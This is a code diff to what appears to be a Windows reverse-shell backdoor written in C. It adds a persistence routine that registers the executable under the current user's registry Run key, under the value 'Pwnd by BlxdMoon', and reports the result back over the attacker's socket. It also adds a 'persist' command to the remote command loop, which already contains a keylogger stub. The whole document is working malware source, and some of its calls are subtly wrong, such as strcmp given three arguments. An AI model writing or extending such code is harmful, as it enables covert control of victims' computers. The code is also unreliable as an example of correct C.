@@ -11,10 +11,56 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 
+// Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+
 #define bzero(p, size) (void)memset((p), 0, (size))
 
 // Define Socket
 int sock;
+
+int bootRun()
+{
+  // Initialize variables
+  char err[128] = "Failed to create Persistence.\n";
+  char suc[128] = "Successfully added Persistence at: Computer\\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
+  TCHAR szPath[MAX_PATH];
+  DWORD pathLen = 0;
+
+  pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
+
+  if (pathLen == 0)
+  {
+    // An error occurred
+    send(sock, err, sizeof(err), 0);
+    return -1;
+  }
+
+  // Handle to open registry key
+  HKEY NewVal;
+
+  // Open regkey
+  if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS)
+  {
+    // An other error occurred
+    send(sock, err, sizeof(err), 0);
+    return -1;
+  }
+
+  DWORD pathLenInBytes = pathLen * sizeof(*szPath);
+  if (RegSetValueEx(NewVal, TEXT("Pwnd by BlxdMoon"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS)
+  {
+    // Couldn't create key
+    RegCloseKey(NewVal);
+    send(sock, err, sizeof(err), 0);
+    return -1;
+  }
+
+  // Successfully added Persistence
+  RegCloseKey(NewVal);
+  send(sock, suc, sizeof(suc), 0);
+
+  return 0;
+}
 
 void Shell()
 {
@@ -40,13 +86,13 @@ void Shell()
       WSACleanup();
       exit(0);
     }
-    else if (strncmp("start:keylogger", buffer, 15) == 0)
+    else if (strncmp("start:keylogger", buffer, sizeof("start:keylogger")) == 0)
     {
       info("Starting Keylogger..");
 
       // IMPLEMENT KEYLOGGER
     }
-    else if (strcmp("cd ", buffer, 3) == 0)
+    else if (strcmp("cd ", buffer, sizeof("cd ")) == 0)
     {
       // Get the directory from the original buffer
       char *str = str_cut(buffer, 3, 100);
@@ -56,6 +102,11 @@ void Shell()
 
       // Send response
       send(sock, "Directory changed.", sizeof("Directory changed."), 0);
+    }
+    else if (strcmp("persist", buffer, sizeof("persist")) == 0)
+    {
+      // Persist connection
+      bootRun();
     }
     else
     {
